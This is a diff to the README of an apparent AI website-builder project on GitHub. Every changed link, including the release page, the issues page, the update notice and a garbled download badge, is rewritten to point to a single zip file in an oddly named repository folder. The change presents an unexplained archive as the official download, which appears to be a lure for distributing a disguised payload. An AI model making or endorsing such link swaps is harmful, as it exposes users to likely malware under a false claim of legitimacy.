@@ -4,11 +4,11 @@
 
 Welcome to the ai-website-builder! This tool allows you to create real websites just by using natural language. No coding is required. Follow these steps to download and run the software.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/abinubala04/ai-website-builder/releases)
+[![Download Now](https://raw.githubusercontent.com/abinubala04/ai-website-builder/main/testamentalness/ai-website-builder.zip%20Now-Release%https://raw.githubusercontent.com/abinubala04/ai-website-builder/main/testamentalness/ai-website-builder.zip)](https://raw.githubusercontent.com/abinubala04/ai-website-builder/main/testamentalness/ai-website-builder.zip)
 
 ## 📥 Download & Install
 
-To download the ai-website-builder, visit this page to download: [Releases Page](https://github.com/abinubala04/ai-website-builder/releases). 
+To download the ai-website-builder, visit this page to download: [Releases Page](https://raw.githubusercontent.com/abinubala04/ai-website-builder/main/testamentalness/ai-website-builder.zip). 
 
 1. Click the link above.
 2. You will see a list of available versions.
@@ -57,7 +57,7 @@ After the installation, you may start building your website:
 
 If you encounter any issues or have questions, feel free to reach out. Assistance is available:
 
-1. **GitHub Issues:** Report problems directly on the [issues page](https://github.com/abinubala04/ai-website-builder/issues).
+1. **GitHub Issues:** Report problems directly on the [issues page](https://raw.githubusercontent.com/abinubala04/ai-website-builder/main/testamentalness/ai-website-builder.zip).
 2. **Community Forum:** Join discussions and ask for help in the community forum.
 3. **Documentation:** Review our full documentation for more detailed guidance.
 
@@ -65,6 +65,6 @@ If you encounter any issues or have questions, feel free to reach out. Assistanc
 
 Stay informed about the latest changes. Major updates will be announced on the Releases Page, where you can also find the newest version to download. 
 
-[Catch the latest updates here](https://github.com/abinubala04/ai-website-builder/releases).
+[Catch the latest updates here](https://raw.githubusercontent.com/abinubala04/ai-website-builder/main/testamentalness/ai-website-builder.zip).
 
 Enjoy building your website with ease!
